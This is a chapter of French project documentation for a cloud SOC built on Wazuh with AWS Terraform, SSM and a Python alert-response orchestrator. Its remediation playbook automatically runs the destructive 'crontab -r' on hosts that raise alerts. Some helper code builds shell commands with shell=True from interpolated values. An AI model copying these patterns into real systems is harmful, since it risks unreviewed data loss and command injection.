## 5.4 Intégration AWS (S3, ECR, SSM) {#54-integration-aws}

### 5.4.1 Distribution des Images de Supervision : Amazon ECR

#### Configuration ECR

```hcl
# terraform/ecr.tf
resource "aws_ecr_repository" "wazuh" {
  name = "wazuh"
  image_tag_mutability = "MUTABLE"
  image_scanning_configuration {
    scan_on_push = true
  }
}

resource "aws_ecr_lifecycle_policy" "wazuh" {
  repository = aws_ecr_repository.wazuh.name
  policy = jsonencode({
    rules = [{
      action = { type = "expire" }
      selection = {
        tagStatus = "untagged"
        countType = "sinceImagePushed"
        countUnit = "days"
        countNumber = 7
      }
    }]
  })
}
```

#### Authentification Éphémère

```python
# cloudsoc/aws/ecr.py
import boto3
import subprocess

def push_to_ecr(image_name, tag, region):
    ecr = boto3.client('ecr', region_name=region)
    
    # Générer token temporaire (12h)
    auth_data = ecr.get_authorization_token()
    token = auth_data['authorizationData'][0]['authorizationToken']
    endpoint = auth_data['authorizationData'][0]['proxyEndpoint']
    
    # Login Docker
    subprocess.run(
        f'echo {token} | docker login -u AWS --password-stdin {endpoint}',
        shell=True,
        check=True
    )
    
    # Push image
    subprocess.run(
        f'docker push {endpoint}/{image_name}:{tag}',
        shell=True,
        check=True
    )
```

### 5.4.2 Archivage Immuable des Journaux : Amazon S3

#### Bucket Configuration

```hcl
# terraform/s3.tf
resource "aws_s3_bucket" "wazuh_logs" {
  bucket = "wazuh-logs-${data.aws_caller_identity.current.account_id}"
}

resource "aws_s3_bucket_versioning" "wazuh_logs" {
  bucket = aws_s3_bucket.wazuh_logs.id
  versioning_configuration {
    status = "Enabled"
  }
}

resource "aws_s3_bucket_server_side_encryption_configuration" "wazuh_logs" {
  bucket = aws_s3_bucket.wazuh_logs.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "AES256"
    }
  }
}

resource "aws_s3_bucket_public_access_block" "wazuh_logs" {
  bucket = aws_s3_bucket.wazuh_logs.id
  block_public_acls = true
  block_public_policy = true
  ignore_public_acls = true
  restrict_public_buckets = true
}
```

### 5.4.3 Le Canal de Contrôle Sécurisé : AWS Systems Manager (SSM)

#### Session Manager

```python
# cloudsoc/aws/ssm.py
def start_session(instance_id, region):
    ssm = boto3.client('ssm', region_name=region)
    
    response = ssm.start_session(
        Target=instance_id,
        DocumentName='AWS-StartInteractiveCommand'
    )
    
    return response['SessionId']
```

#### Port Forwarding (Dashboard Wazuh)

```python
def port_forward(instance_id, local_port, remote_port, region):
    import subprocess
    
    cmd = [
        'aws', 'ssm', 'start-session',
        '--target', instance_id,
        '--document-name', 'AWS-StartPortForwardingSession',
        '--parameters', f'localPortNumber={local_port},portNumber={remote_port}',
        '--region', region
    ]
    
    subprocess.run(cmd)
```

**Résultat** : Accès Dashboard via `https://localhost:8443`

---

## 5.5 Développement des Scripts Python {#55-scripts-python}

### 5.5.1 L'Exécuteur de Tâches (executor.py)

**Localisation** : `/cloudsoc/deployment/executor.py`

#### Classe DeploymentTask

```python
class DeploymentTask:
    def __init__(self, name: str, task_type: str, config: Dict[str, Any]):
        self.name = name
        self.task_type = task_type
        self.config = config
    
    def execute(self, variables: Dict[str, Any]) -> bool:
        if self.task_type == "shell":
            return self._execute_shell(variables)
        elif self.task_type == "command":
            return self._execute_command(variables)
        elif self.task_type == "package":
            return self._execute_package(variables)
        # ... autres types
    
    def _substitute_vars(self, text: str, variables: Dict) -> str:
        for key, value in variables.items():
            text = text.replace(f"{{{{ {key} }}}}", str(value))
        return text
```

#### Interprétation YAML

```python
def load_playbook(playbook_path: str) -> List[DeploymentTask]:
    with open(playbook_path, 'r') as f:
        config = yaml.safe_load(f)
    
    tasks = []
    for step in config.get('steps', []):
        task = DeploymentTask(
            name=step['name'],
            task_type=step['type'],
            config=step
        )
        tasks.append(task)
    
    return tasks
```

### 5.5.2 Le Moteur de Réponse Automatisée (orchestrator.py)

**Localisation** : `/cloudsoc/orchestrator.py`

#### Ingestion Alertes

```python
class SoarOrchestrator:
    def __init__(self, alerts_file: str):
        self.alerts_file = alerts_file
        self.rules = self._load_response_rules()
    
    def monitor_alerts(self):
        with open(self.alerts_file, 'r') as f:
            # Aller à la fin du fichier (Tailing)
            f.seek(0, 2)
            
            while True:
                line = f.readline()
                if not line:
                    time.sleep(0.5)
                    continue
                
                alert = json.loads(line)
                self.process_alert(alert)
    
    def process_alert(self, alert: Dict):
        rule_id = alert['rule']['id']
        rule_level = alert['rule']['level']
        
        # Filtrage critères
        if rule_level < 10:
            return  # Non critique
        
        # Recherche playbook
        playbook = self._find_remediation_playbook(rule_id)
        if not playbook:
            return
        
        # Exécution
        self._execute_remediation(playbook, alert)
```

#### Matrice de Remédiation

```python
REMEDIATION_RULES = {
    533: {  # Cron modification
        'playbook': 'playbooks/response/remediate_cron.yml',
        'conditions': {
            'level': 10,
            'action': 'isolate_network'
        }
    },
    # ... autres règles
}
```

### 5.5.3 Couplage et Communication Inter-Modules

#### Chaînage Orchestrator → Executor

```python
def _execute_remediation(self, playbook_path: str, alert: Dict):
    # Charger tâches playbook
    tasks = load_playbook(playbook_path)
    
    # Construire contexte variables
    variables = {
        'target_ip': alert['agent']['ip'],
        'target_id': alert['agent']['id'],
        'timestamp': alert['timestamp'],
        'rule_id': alert['rule']['id']
    }
    
    # Exécuter séquentiellement
    for task in tasks:
        success = task.execute(variables)
        if not success:
            logger.error(f"Task '{task.name}' failed for {variables['target_ip']}")
            break
        
        logger.info(f"Task '{task.name}' succeeded")
```

#### Isolation Réseau

```yaml
# playbooks/response/remediate_cron.yml
name: "Remediate Malicious Cron"
steps:
  - name: "Isolate network"
    type: "aws_ec2"
    action: "modify_security_group"
    instance_id: "{{ target_id }}"
    security_group: "sg-isolation"
  
  - name: "Clean crontab"
    type: "aws_ssm"
    instance_id: "{{ target_id }}"
    command: "crontab -r"
  
  - name: "Verify cleanup"
    type: "aws_ssm"
    instance_id: "{{ target_id }}"
    command: "crontab -l"
```

---

## 5.6 Conclusion {#56-conclusion-chap5}

Ce chapitre a détaillé la réalisation concrète de chaque couche :

✅ **Infrastructure** : Terraform modularisé, 3 subnets, Security Groups stricts

✅ **SOC** : Wazuh Docker Compose, certificats TLS, visibilité complète

✅ **Agents** : Linux + Windows, chiffrement, enrôlement sécurisé

✅ **Intégration AWS** : ECR, S3 immuable, SSM sans SSH

✅ **Automation** : Python SOAR, orchestration YAML, couplage lâche

**Résultat** : Plateforme SOC entièrement automatisée, scalable et conforme aux standards DevSecOps.

---

## Annexe : Répertoires et Fichiers Clés

```
/workspaces/cloud-soc-wazuh-automation/
├── terraform/                    # IaC AWS
│   ├── main.tf
│   ├── network.tf
│   ├── instance.tf
│   ├── security_groups.tf
│   └── ...
├── cloudsoc/                     # Python Orchestrator
│   ├── main.py                   # CLI Typer
│   ├── orchestrator.py           # SOAR engine
│   ├── deployment/executor.py    # Task executor
│   └── aws/                      # AWS wrappers
├── wazuh-docker/                 # Wazuh Stack
│   ├── docker-compose.yml
│   ├── config/                   # Configurations Wazuh
│   └── generate-indexer-certs.yml
├── playbooks/
│   ├── emulation/                # Attack scenarios (Atomic Red Team)
│   └── response/                 # Remediation playbooks
└── docs/                         # Documentation
```

---

**Document Generated**: 2026-07-03
**Project**: Cloud SOC – Wazuh Threat Detection & Python Orchestrator
**Repository**: https://github.com/ranaitsan123/cloud-soc-wazuh-automation
